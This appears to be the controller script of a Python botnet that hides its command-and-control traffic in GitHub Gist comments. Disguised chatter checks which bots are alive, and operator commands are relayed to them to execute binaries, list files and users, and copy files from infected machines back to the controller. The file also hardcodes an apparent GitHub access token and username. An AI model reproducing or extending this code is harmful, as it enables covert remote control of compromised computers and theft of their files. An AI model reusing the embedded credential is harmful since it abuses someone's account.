from simplegist import Simplegist
import random
import time
import threading
ghGist = Simplegist(username='jirikdan', api_token='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')


botIsAliveQuestion = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]

## check if bots are alive periodically
def checkBots():
    while True:
        time.sleep(3000)
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveQuestion))
        beforeAsking = len(ghGist.comments().listall(name='secret.txt'))
        time.sleep(6)
        afterAsking = len(ghGist.comments().listall(name='secret.txt'))
        print("There are " + str(afterAsking - beforeAsking) + " alive Bots")
        time.sleep(30)

thread = threading.Thread(target=checkBots)
thread.daemon = True
thread.start()

while True:
    #command = raw_input("Paste your command or type HELP for help\n")
    command = raw_input()
    if command == "HELP":
        print("w - (list of users currently logged in)")
        print("ls <PATH> (list content of specified directory)")
        print("id (if of current user)")
        print("Copy a file from the bot to the controller. The file name is specified")
        print("Execute a binary inside the bot given the name of the binary. Example: execute /usr/bin/ps")
    if command.startswith('execute'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
    if command.startswith('w'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
    if command.startswith('ls'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)
    if command.startswith('copy'):
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=command)